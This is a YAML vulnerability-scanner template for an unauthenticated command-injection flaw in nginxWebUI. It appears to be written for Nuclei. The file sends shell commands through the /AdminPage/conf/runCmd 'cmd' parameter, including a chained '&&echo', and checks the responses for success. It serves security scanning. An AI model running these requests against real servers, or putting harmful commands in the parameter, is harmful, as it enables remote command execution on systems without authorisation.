@@ -1,0 +1,49 @@
+id: yaml-poc-nginxwebui-nginxwebui-command_injection-CT-728853
+info:
+  name: Yaml Poc Nginxwebui Nginxwebui Command_Injection Ct 728853
+  author: xiao.xiao
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-nginxwebui-nginxwebui-command_injection-CT-728853'
+  tags: nginx,rce
+  reference:
+  - https://zone.huoxian.cn/d/1210-nginx
+http:
+- method: GET
+  path:
+  - /AdminPage/conf/runCmd?cmd=expr%20{{s1}}%20-%20{{s2}}%26%26echo%20nginx
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 运行失败
+- method: GET
+  path:
+  - /AdminPage/conf/runCmd?cmd=echo%20{{s3}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 运行成功
+- method: GET
+  path:
+  - /aDminPage/about
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - <title>nginxWebUI</title>
